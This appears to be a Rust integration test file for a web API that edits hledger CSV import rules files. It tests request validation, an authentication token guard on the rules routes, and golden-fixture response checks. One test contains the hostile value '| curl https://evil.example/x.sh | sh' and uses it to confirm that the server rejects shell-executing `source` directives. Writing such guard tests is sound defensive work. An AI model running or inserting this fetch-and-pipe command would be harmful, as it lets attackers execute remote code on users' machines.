// ---------------------------------------------------------------------------

/// An opaque item can be kept, moved or deleted, never rewritten: rewriting one
/// part of a construct the engine declined to classify could change what the
/// rest of it means.
#[tokio::test]
async fn rewriting_an_opaque_item_is_a_400() {
    let tree = Tree::standard();
    let before = tree.read("import/2026/bank.csv.rules");
    let (revision, items) = load(&tree.state).await;

    let table = items
        .iter()
        .find(|item| item["kind"] == "opaque")
        .expect("the `if` table")["id"]
        .clone();
    let order: Vec<Value> = items
        .iter()
        .map(|item| {
            if item["id"] == table {
                json!({"kind": "assignment", "id": item["id"], "field": "account2", "value": "x"})
            } else {
                json!({"kind": "keep", "id": item["id"]})
            }
        })
        .collect();

    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.contains("was not classified"), "{body}");
    assert_eq!(tree.read("import/2026/bank.csv.rules"), before);
}

/// The remote-code-execution guard, over HTTP. `source ... | CMD` is a shell
/// command `hledger import` runs, so nothing may AUTHOR one through Ledgeline —
/// with or without the pipe, since the pipe is one keystroke away afterwards.
#[tokio::test]
async fn inserting_a_source_directive_is_a_400() {
    let tree = Tree::standard();
    let before = tree.read("import/2026/bank.csv.rules");
    let (revision, items) = load(&tree.state).await;

    for value in ["| curl https://evil.example/x.sh | sh", "./harmless.csv"] {
        let mut order = keep_all(&items);
        order.push(json!({"kind": "directive", "name": "source", "value": value}));
        let (status, body) = text(
            &tree.state,
            "PUT",
            BANK,
            Some(json!({"revision": revision, "items": order})),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{value}");
        assert!(body.contains("through the shell on import"), "{body}");
        assert_eq!(tree.read("import/2026/bank.csv.rules"), before);
    }
}

/// The existing `source` line is still keep-only, so a rewrite is refused too.
#[tokio::test]
async fn rewriting_an_existing_source_directive_is_a_400() {
    let tree = Tree::standard();
    let (revision, items) = load(&tree.state).await;
    let source = items
        .iter()
        .find(|item| item["kind"] == "directive" && item["name"] == "source")
        .expect("the source line")["id"]
        .clone();
    let order: Vec<Value> = items
        .iter()
        .map(|item| {
            if item["id"] == source {
                json!({"kind": "directive", "id": item["id"], "name": "source", "value": "./other.csv"})
            } else {
                json!({"kind": "keep", "id": item["id"]})
            }
        })
        .collect();
    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": order})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.contains("`source`"), "{body}");
}

/// A whole-document replace is strict: an unrecognized key must not silently
/// mean "leave that part alone".
#[tokio::test]
async fn an_unknown_key_in_the_save_body_is_a_400() {
    let tree = Tree::standard();
    let (revision, items) = load(&tree.state).await;
    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": keep_all(&items), "delte": [0]})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.starts_with("invalid request body: "), "{body}");
}

#[tokio::test]
async fn an_unknown_item_id_is_a_400() {
    let tree = Tree::standard();
    let (revision, _) = load(&tree.state).await;
    let (status, body) = text(
        &tree.state,
        "PUT",
        BANK,
        Some(json!({"revision": revision, "items": [{"kind": "keep", "id": 9999}]})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.contains("unknown item id 9999"), "{body}");
}

// ---------------------------------------------------------------------------
// Editing disabled, and the token guard
// ---------------------------------------------------------------------------

/// A server with no journal file bound to an editor may not rewrite files
/// beside one — and it answers with the editor's own sentence, which the SPA
/// maps to `NativeApiUnavailableError`.
#[tokio::test]
async fn saving_on_a_read_only_state_is_a_501() {
    let tree = Tree::standard();
    let (status, body) = text(
        &tree.read_only(),
        "PUT",
        BANK,
        Some(json!({"revision": "x", "items": []})),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_IMPLEMENTED);
    assert_eq!(
        body,
        "editing is not enabled: this server was started without a journal file bound to an editor"
    );
}

/// SEC-1, for the newest write primitive. These routes are registered ABOVE the
/// `route_layer` token guard in `router_with_security`; below it they would be
/// an UNAUTHENTICATED way to rewrite a file in the user's journal directory.
/// Moving them must fail here rather than ship.
#[tokio::test]
async fn every_rules_route_requires_the_token() {
    const PORT: u16 = 5099;
    const HOST: &str = "127.0.0.1:5099";
    let tree = Tree::standard();
    let token = AccessToken::parse("integration-test-token").expect("well-formed token");

    let probe = |method: &'static str, uri: String, auth: Option<&'static str>| {
        let state = tree.state.clone();
        let security = Security::local(token.clone(), PORT);
        async move {
            let mut builder = Request::builder()
                .method(method)
                .uri(&uri)
                .header(HeaderName::from_static("host"), HOST);
            if let Some(value) = auth {
                builder = builder.header(header::AUTHORIZATION, value);
            }
            let request = builder
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from("{\"revision\":\"x\",\"items\":[]}"))
                .expect("request builds");
            router_with_security(state, security)
                .oneshot(request)
                .await
                .expect("router responds")
                .status()
        }
    };

    for (method, uri) in [
        ("GET", "/api/rules".to_string()),
        ("GET", BANK.to_string()),
        (
            "GET",
            "/api/rules-preview/import/2026/bank.csv.rules".to_string(),
        ),
        ("PUT", BANK.to_string()),
        // The draft route writes nothing, and is still behind the guard: it
        // reads the journal's own directory tree and another tab's staged
        // upload, both of which are this server's business and nobody else's.
        ("POST", "/api/rules-create".to_string()),
    ] {
        assert_eq!(
            probe(method, uri.clone(), None).await,
            StatusCode::UNAUTHORIZED,
            "{method} {uri} without a token must be 401"
        );
        assert_eq!(
            probe(method, uri.clone(), Some("Bearer wrong-token-entirely")).await,
            StatusCode::UNAUTHORIZED,
            "{method} {uri} with a wrong token must be 401"
        );
        assert_ne!(
            probe(method, uri.clone(), Some("Bearer integration-test-token")).await,
            StatusCode::UNAUTHORIZED,
            "{method} {uri} with the token must get past the guard"
        );
    }
}

// ---------------------------------------------------------------------------
// Golden bytes
// ---------------------------------------------------------------------------

/// The committed request set, shared with `just snapshot-rules-wire` so a
/// fixture and the request that produced it cannot drift apart.
fn golden_requests() -> Vec<(String, String)> {
    let path = fixtures_dir().join("rules/golden/requests.tsv");
    let text = std::fs::read_to_string(&path).expect("rules/golden/requests.tsv readable");
    text.lines()
        .filter(|line| !line.trim_start().starts_with('#') && !line.trim().is_empty())
        .map(|line| {
            let (name, uri) = line
                .split_once('\t')
                .unwrap_or_else(|| panic!("requests.tsv line is not `name<TAB>uri`: {line:?}"));
            (name.to_string(), uri.to_string())
        })
        .collect()
}

/// Editing-enabled state over the COMMITTED `fixtures/rules/tree/` journal —
/// the same journal `just snapshot-rules-wire` serves, which is what makes the
/// bytes comparable. Opening an editor reads; it never writes.
fn fixture_tree_state() -> AppState {
    AppState::from_journal_path(fixtures_dir().join("rules/tree/main.journal"))
        .expect("the fixture journal opens")
}

/// Borrowed from `native_wire_golden.rs`: when the bytes differ, say WHY in
/// terms of keys before falling back to offsets, because a rename shows up as a
/// paired absent/new key at the same path.
fn describe_difference(path: &str, expected: &Value, actual: &Value, out: &mut Vec<String>) {
    const MAX_FINDINGS: usize = 20;
    if out.len() >= MAX_FINDINGS {
        return;
    }
    match (expected, actual) {
        (Value::Object(want), Value::Object(got)) => {
            for (key, value) in want {
                match got.get(key) {
                    Some(live) => describe_difference(&format!("{path}.{key}"), value, live, out),
                    None => out.push(format!(
                        "{path}.{key}: in the fixture but ABSENT from the live response \
                         (renamed or dropped?)"
                    )),
                }
            }
            for key in got.keys().filter(|key| !want.contains_key(*key)) {
                out.push(format!("{path}.{key}: NEW in the live response"));
            }
        }
        (Value::Array(want), Value::Array(got)) if want.len() == got.len() => {
            for (i, (value, live)) in want.iter().zip(got).enumerate() {
                describe_difference(&format!("{path}[{i}]"), value, live, out);
            }
        }
        (Value::Array(want), Value::Array(got)) => out.push(format!(
            "{path}: fixture has {} elements, live response has {}",
            want.len(),
            got.len()
        )),
        _ if expected != actual => out.push(format!("{path}: expected {expected}, got {actual}")),
        _ => {}
    }
}

async fn assert_matches_golden(name: &str) {
    let uri = golden_requests()
        .into_iter()
        .find(|(entry, _)| entry == name)
        .unwrap_or_else(|| panic!("requests.tsv has no entry named {name:?}"))
        .1;
    let path = fixtures_dir()
        .join("rules/golden")
        .join(format!("{name}.json"));
    let expected = std::fs::read(&path)
        .unwrap_or_else(|e| panic!("{name}.json readable ({e}) — run `just snapshot-rules-wire`"));

    let (status, _, actual) = send(&fixture_tree_state(), "GET", &uri, None).await;
    assert_eq!(status, StatusCode::OK, "GET {uri} should be 200");
    if actual == expected {
        return;
    }

    let mut findings = Vec::new();
    match (
        serde_json::from_slice::<Value>(&expected),
        serde_json::from_slice::<Value>(&actual),
    ) {
        (Ok(want), Ok(got)) => describe_difference("$", &want, &got, &mut findings),
        _ => findings.push("one side is not valid JSON".to_string()),
    }
    if findings.is_empty() {
        findings.push(
            "the two bodies are semantically equal but not byte-equal (key order, number \
             formatting, or an omitted-vs-null key changed)"
                .to_string(),
        );
    }
    panic!(
        "the rules wire for `{name}` no longer matches fixtures/rules/golden/{name}.json:\n  {}\n\n\
         If this change was deliberate, regenerate with `just snapshot-rules-wire` and review the \
         diff — every byte of this wire is a choice the SPA depends on. If it was not deliberate, \
         something changed the shape of a response nobody meant to change.",
        findings.join("\n  ")
    );
}

#[tokio::test]
async fn the_index_matches_its_golden() {
    assert_matches_golden("rules-index").await;
}

#[tokio::test]
async fn the_document_matches_its_golden() {
    assert_matches_golden("rules-doc").await;
}

/// Every manifest entry has a committed body and a named test above, and no
/// stray `.json` is left behind — the same meta-test `native_wire_golden.rs`
/// has, and for the same reason: an unguarded endpoint is the gap these files
/// exist to close.
#[test]
fn every_golden_entry_is_covered_by_a_committed_body() {
    let entries = golden_requests();
    assert_eq!(
        entries.len(),
        2,
        "the manifest gained or lost an endpoint; add/remove the matching \
         #[tokio::test] above and update this count"
    );

    let dir = fixtures_dir().join("rules/golden");
    let mut committed: Vec<String> = std::fs::read_dir(&dir)
        .expect("fixtures/rules/golden readable")
        .filter_map(|entry| {
            let name = entry.ok()?.file_name().to_string_lossy().to_string();
            name.strip_suffix(".json").map(str::to_string)
        })
        .collect();
    committed.sort();

    let mut named: Vec<String> = entries.iter().map(|(name, _)| name.clone()).collect();
    named.sort();
    assert_eq!(
        named, committed,
        "fixtures/rules/golden/*.json and requests.tsv disagree — run `just snapshot-rules-wire`"
    );
}

/// The goldens are taken over a COMMITTED tree, so nothing in them may depend
/// on where the repository happens to be checked out. A path that leaked into
/// one would make it unreproducible on another machine — and would be exactly
/// the disclosure layer 5 exists to prevent.
#[test]
fn no_golden_body_contains_an_absolute_path() {
    // Both spellings of the checkout, and the scan root itself. A relative
    // mention inside a fixture's own comment text is fine and expected — what
    // must never appear is a path that resolves.
    let mut secrets = vec![fixtures_dir(), fixtures_dir().join("rules/tree")];
    if let Some(repo) = fixtures_dir().parent() {
        secrets.push(repo.to_path_buf());
    }
    let secrets: Vec<String> = secrets
        .iter()
        .flat_map(|path| {
            let mut spellings = vec![path.to_string_lossy().into_owned()];
            if let Ok(canonical) = path.canonicalize() {
                spellings.push(canonical.to_string_lossy().into_owned());
            }
            spellings
        })
        .collect();

    for (name, _) in golden_requests() {
        let path = fixtures_dir()
            .join("rules/golden")
            .join(format!("{name}.json"));
        let body = std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("{name}.json: {e}"));
        for secret in &secrets {
            assert!(
                !body.contains(secret.as_str()),
                "{name}.json discloses {secret}"
            );
        }
    }
}
